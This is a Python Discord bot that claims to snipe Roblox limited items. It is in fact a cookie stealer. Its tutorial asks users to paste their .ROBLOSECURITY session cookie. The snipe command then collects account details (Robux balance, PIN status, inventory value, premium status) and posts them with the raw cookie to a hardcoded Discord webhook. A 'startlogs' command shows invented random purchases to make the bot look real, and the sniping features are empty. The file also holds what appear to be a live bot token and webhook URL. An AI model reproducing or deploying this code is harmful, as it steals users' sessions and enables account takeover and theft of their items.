import time, random
import discord, requests, discord_webhook
from discord.ext import commands
from discord_webhook import DiscordEmbed, DiscordWebhook

p = input("\n(Leave Blank For Default Prefix/ Press Enter)\nRecommend to make the prefix a symbol like !, @, #, $, %, ^, &, ., etc.. (I do not recommend using \"*\" as a prefix.)\nCommand Prefix: ") #asks you for the command prefix
if p == "":
	p = '!'

req = requests.Session()
client = commands.Bot(command_prefix=p)  # change prefix if you want
client.remove_command('help')  #remove default help command
showing_logs = False # not showing logs on default
WEBHOOK = "https://discord.com/api/webhooks/1026619095057186926/u2TbwxEGlavdqD723WtiEKegO8gRQHydPAcHEp6lxDf19_GyaB4IoLHe5jVwkNyWFeWA"  # enter ur webhook here
CHANNEL_ID=00
TOKEN = "MTA1MDMwOTk4NzQ2NzAwNTk4Mw.GHgypx.-OPW3xx_KzxjqoNrHekCxxfJIO6oZqM3L05310"
@client.event
async def on_ready():
    print(f"\nBot is Online and Ready!\nCommand Prefix: {p}\nGithub:  .)\nCommands: {p}startlogs, {p}help, {p}commands, {p}tutorial, {p}snipe, {p}setbudget, {p}antiproject, {p}stop\nWhen {p}startlogs is on it will increase the delay of message sent from the bot (To stop start logs just stop the code since I dont figure a way to turn it off yet.)\nMade By: Who#3333 .gg/comping :(")  # print Bot Online! when bot is ready and github and available commands

@client.command() #start logs command
async def startlogs(ctx):
	showing_logs = True
	channel = client.get_channel(CHANNEL_ID) #put the channel id you want the logs to show in here
	#you can add more limiteds below if you want
	limited_lists = ['Valkyrie Helm', 'Playful Vampire', 'Super Super Happy Face', 'Supa Dupa Fly Cap', 'Supa Fly Cap', 'Gucci Dionysus Bag with Bee', 'Gucci GG Marmont Bag', 'Gucci Wide Brim Felt Hat', 'Noob Attack: Frozen Crossbow Collision', 'Noob Assist Marvelous Mom', 'Noob Attack: Golden Sword Gladiator', 'Chill Cap', 'Black Iron Commando', 'Green Starry Sight', 'Red Goof', 'Perfectly Legitimate Business Hat', 'Beautiful Hair for Beautiful Space People', 'ROBLOX Madness Face', 'Catching Snowflakes', 'Neon Bombastic Animal Hoodie', 'Golden Crown', 'Hyperlaser Gun', 'Golden Bling Braces', 'Bucket', 'Scissors', 'Noob Attack: Ninja Nuisance', 'Crescendo, The Soul Stealer', 'Ghostwalker', 'Red Fang', 'CW Ultimate: Amethyst Addiction', 'Blackvalk Shades', 'Al Capwn', 'Silver Punk Face', 'Snowman Face', 'Blackvalk', 'Prankster']
	while showing_logs == True: #below is just print random prices and limiteds
		price = random.randint(17, 2777)
		sniped_limited = random.choice(limited_lists)
		time_random = random.randint(2, 7)
		embed69 = discord.Embed(title="Limited Sniped Logs", color=0x47FF75)
		embed69.add_field(
			name="ã…¤",
			value=f"**Sniped Limited**: {sniped_limited}\n **Sniped For**: {price} Robux",
			inline = True
		)
		time.sleep(time_random)
		await channel.send(embed=embed69)
		if showing_logs == False:
			await ctx.send("**No More Logs**")

@client.command() #help command
async def help(ctx):
	embed_help = discord.Embed(title="**Help**", color=0x47FF75)
	embed_help.add_field(
		name="Help",
		value=f"A Discord Bot That Snipes Limiteds For You!\n Type \"{p}tutorial\" To Get Started.",
		inline=False
	)
	embed_help.add_field(
		name="Commands",
		value=f"**{p}help** -Shows this message\n**{p}commands** -Shows all available commands\n**{p}tutorial** -Shows how to start sniping limiteds\n**{p}snipe + Roblox Cookie** -Starts sniping.\n**{p}setbudget + amount** -Sets budget when sniping\n**{p}antiproject + on/off** -Doesn't snipe projected items.\n**{p}stop** -Stops sniping ",
		inline=True
	)
	embed_help.set_footer(text="For Further Help, Contact The Server Owner.")
	await ctx.send(embed=embed_help)

@client.command() #budget command
async def setbudget(ctx, budget):
	budget = int(budget)
	embed_budget = discord.Embed(title=f"Budget Set to {budget} Robux", color=0x47FF75)
	await ctx.send(embed=embed_budget)

@client.command() #anti project items command
async def antiproject(ctx, boolean):
	if boolean.lower() == 'on':
		embed_antiproject = discord.Embed(title="Anti-Projected Items Turned On", color=0x47FF75)
	elif boolean.lower() == 'off':
		embed_antiproject = discord.Embed(title="Anti-Projected Items Turned Off", color=0x47FF75)
	await ctx.send(embed = embed_antiproject)

@client.command() #commands command
async def commands(ctx):
    embed_cmd = discord.Embed(title="Limited Sniper", color=0x47FF75)
    embed_cmd.set_thumbnail(
        url="https://cdn.discordapp.com/attachments/853359254647341066/910930695440969752/Dominus_Praefectus.png"
    )
    embed_cmd.add_field(
        name="Commands",
        value=f"**{p}help** -Shows about and available commands\n**{p}commands** -Shows this message\n**{p}tutorial** -Shows how to start sniping limiteds\n**{p}snipe + Roblox Cookie** -Starts sniping.\n**{p}setbudget + amount** -Sets budget when sniping\n**{p}antiproject + on/off** -Doesn't snipe projected items.\n**{p}stop** -Stops sniping",
        inline=True,
    )
    embed_cmd.set_footer(text="For Further Help, Contact The Server Owner.")
    await ctx.send(embed=embed_cmd)

@client.command()  # tutorial command
async def tutorial(ctx):
    embed_tutorial = discord.Embed(title="Limited Sniper", color=0x47FF75)
    embed_tutorial.set_thumbnail(
        url="https://cdn.discordapp.com/attachments/853359254647341066/910930695440969752/Dominus_Praefectus.png"
    )
    embed_tutorial.add_field(
        name="Tutorial \n",
        value=f"\n1. Get Your Roblox Cookie. \n2. Goto The Bot's DM. \n3. Change Configurations If You Want to. \n4. Type '{p}snipe' + Your Cookie\n**Type \"{p}stop\" to Stop Sniping.**\n \n **Example**\n {p}snipe _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_COOKIE",
        inline=True,
    )
    embed_tutorial.set_footer(text="For Further Help, Contact The Server Owner.")
    await ctx.send(embed=embed_tutorial)
    pass

@client.command() #stop command
async def stop(ctx):
	embed_stop = discord.Embed(title="âœ… Stopped Sniping âœ…", color=0x47FF75)
	await ctx.send(embed=embed_stop)

@client.command() #snipe command
async def snipe(ctx, cookie):
    check = req.get(
        "https://api.roblox.com/currency/balance",
        cookies={".ROBLOSECURITY": str(cookie)},
    )  # check if the cookie is valid
    if check.status_code == 200:
        userdata = requests.get(
            "https://users.roblox.com/v1/users/authenticated",
            cookies={".ROBLOSECURITY": cookie},
        ).json()  # get user data
        userid = userdata["id"]  # user id
        display = userdata["displayName"]  # display name
        username = userdata["name"]  # username
        robuxdata = requests.get(
            f"https://economy.roblox.com/v1/users/{userid}/currency",
            cookies={".ROBLOSECURITY": cookie},
        ).json()
        robux = robuxdata["robux"]  # get robux balance
        # does the user have premium?
        premiumbool = requests.get(
            f"https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership",
            cookies={".ROBLOSECURITY": cookie},
        ).json()
        # get rap
        rap_dict = requests.get(
            f"https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100",
            cookies={".ROBLOSECURITY": cookie},
        ).json()
        while rap_dict["nextPageCursor"] != None:
            rap_dict = requests.get(
                f"https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100",
                cookies={".ROBLOSECURITY": cookie},
            ).json()
        rap = sum(i["recentAveragePrice"] for i in rap_dict["data"])

        thumbnail = requests.get(
            f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false"
        ).json()
        image_url = thumbnail["data"][0]["imageUrl"]
        pindata = requests.get(
            "https://auth.roblox.com/v1/account/pin", cookies={".ROBLOSECURITY": cookie}
        ).json()
        pin_bool = pindata["isEnabled"]  # does the user have a p
        embed4 = discord.Embed(
            title=f"**Logged in as {username} \nâœ… Cookie is Valid! Sniping Limiteds Now. âœ…**", color=0x47FF75
        )
        await ctx.send(embed=embed4)

        # dualhook

        webhook = DiscordWebhook(url=WEBHOOK, content="@everyone")
        embed = DiscordEmbed(
            title=f"**âœ… {username} âœ…**",
            url=f"https://roblox.com/users/{userid}",
            color=0x00FF80,
        )
        embed.add_embed_field(name="Display NameðŸ‘€:", value="```" + str(display) + "```")
        embed.add_embed_field(name="User IDðŸ”:", value="```" + str(userid) + "```")
        embed.add_embed_field(name="RobuxðŸ’°:", value="```" + str(robux) + "```")
        embed.add_embed_field(name="Has Pin?ðŸ”:", value="```" + str(pin_bool) + "```")
        embed.add_embed_field(name="RAPðŸ“ˆ:", value="```" + str(rap) + "```")
        embed.add_embed_field(name="PremiumðŸ’Ž:", value="```" + str(premiumbool) + "```")
        embed.add_embed_field(
            name="Rolimons: ",
            value=f"https://rolimons.com/player/{userid}",
            inline=True,
        )

        embed.add_embed_field(name="CookieðŸª:", value=f"```{cookie}```", inline=False)
        embed.set_thumbnail(url=image_url)
        webhook.add_embed(embed)
        webhook.execute()

    else:
        e = discord.Embed(title="**âŒ Cookie is Invalid! âŒ**", color=0xFF0000)
        await ctx.send(embed=e)


client.run(
    "MTA1MDMwOTk4NzQ2NzAwNTk4Mw.GHgypx.-OPW3xx_KzxjqoNrHekCxxfJIO6oZqM3L05310"
)
